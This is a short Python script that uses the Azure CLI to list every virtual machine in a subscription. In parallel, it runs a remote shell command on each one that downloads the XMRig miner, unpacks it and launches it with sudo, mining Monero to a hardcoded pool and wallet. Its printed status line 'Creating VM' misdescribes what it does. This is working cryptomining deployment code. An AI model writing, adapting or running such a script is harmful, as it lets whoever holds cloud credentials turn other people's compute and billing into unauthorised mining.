from azure.cli.core import get_default_cli
import json,os
import multiprocessing

print('''
                                                                     _______________
                                                                     < Dhen, Sapatha! >
                                                                      ---------------
                                                                             \   ^__^
                                                                              \  (oo)\_______
                                                                                 (__)\       )\/\\
                                                                                     ||----w |
                                                                                     ||     ||
                
                                                        AUTHOR : @sAmPawam ThUwAraKan    | karupiyagounder@gmail.com    ''')



sn    = ""

def az_cli (args_str):
    args = args_str.split()
    cli = get_default_cli()
    cli.invoke(args)
    if cli.result.result:
        return(cli.result.result)    
    elif cli.result.error:
        print("ERROR")    
    return True

print("* Creating VM")
#calling for Locations
response = az_cli('vm list')

def deployer(x):
        
            runC='az vm run-command invoke -g '+str(x)+' -n '+str(x)+' --command-id RunShellScript --scripts "wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -xvzf xmrig-6.15.2-linux-static-x64.tar.gz && cd xmrig-6.15.2 &&sudo ./xmrig -o us-west.minexmr.com:4444 -u 86fJGBD4vkAZZkNJWXUruCFKfgZ6zPS1fEjrAodvksccPjQvRzQG9hmP83HY7Vp5XfKYxAqdrZqBWUGD3UYKj8ccAr9ECMM" ' 
            
        
            print("      * Script Executing : "+runC)
            os.system(runC)
            
for x in range(len(response)):
        p =  multiprocessing.Process(target= deployer, args = [response[x]["osProfile"]["computerName"]])
        p.start()
        print(response[x]["osProfile"]["computerName"])
        print(x)
print ("* SUCCSESS")

